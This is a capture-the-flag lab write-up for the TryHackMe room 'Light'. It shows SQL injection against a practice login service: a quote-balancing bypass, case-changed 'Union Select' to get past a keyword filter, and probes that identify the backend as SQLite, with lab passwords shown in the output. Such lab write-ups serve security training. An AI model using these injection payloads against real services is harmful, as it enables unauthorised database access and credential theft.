# **Easy - Welcome to the Light database application!**
https://tryhackme.com/room/lightroom

I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using ``nc 10.10.22.91 1337``
You can use the username smokey in order to get started.

# Reconnaissance
Target: 10.10.22.91

We connect with
``nc 10.10.22.91 1337``

and enter username smokey gives us 

```
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

# Findings
- We try some obious admin credentails, no luck.
- We hit it with a large username list, we get users like alice although no admin
- We hit with some SQL inject and find there is some custom filtering

```
Please enter your username: ``' or 1=1 --``
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```
# Exploiting Findings

Find some weakness in the filtering we remove -- to find it by-passes filter but we get an error, 
```
Please enter your username: ' or 1=1 
Error: unrecognized token: "' LIMIT 30"

Please enter your username: ' or '1'='1' 
Error: unrecognized token: "'1'' LIMIT 30"
```
Ahh get around the sytax error with
```
Please enter your username: ' or '1'='1  
Password: tF8tj2o94WE4LKC
```

Now what SQLtype? more filtering to overcome 
```
Please enter your username: ' UNION SELECT @@version'
Ahh there is a word in there I don't like :( 
```
Union Select Looks to bypass filters, 

```
Please enter your username: SELECT                                                                                                                                                                                                                                     
Ahh there is a word in there I don't like :(                                                                                                                                                                                                                           
Please enter your username: UNION                                                                                                                                                                                                                                      
Ahh there is a word in there I don't like :(                                                                                                                                                                                                                           
Please enter your username: Select                                                                                                                                                                                                                                     
Username not found.                                                                                                                                                                                                                                                    
Please enter your username: Union                                                                                                                                                                                                                                      
Username not found.                                                                                                                                                                                                                                                    
Please enter your username:      
```

back to find SQL type

MySQL
```
Please enter your username: ' Union Select @@version'                                                                                                                                                                                                                  
Error: unrecognized token: "@"  
```

PostgreSQL
```
Please enter your username: ' Union Select version()'                                                                                                                                                                                                                  
Error: no such function: version      
```

SQLite
```
Please enter your username: ' Union Select sqlite_version()'                                                                                                                                              
Password: 3.31.1  
```






What is the admin username?
What is the password to the username mentioned in question 1?
What is the flag?



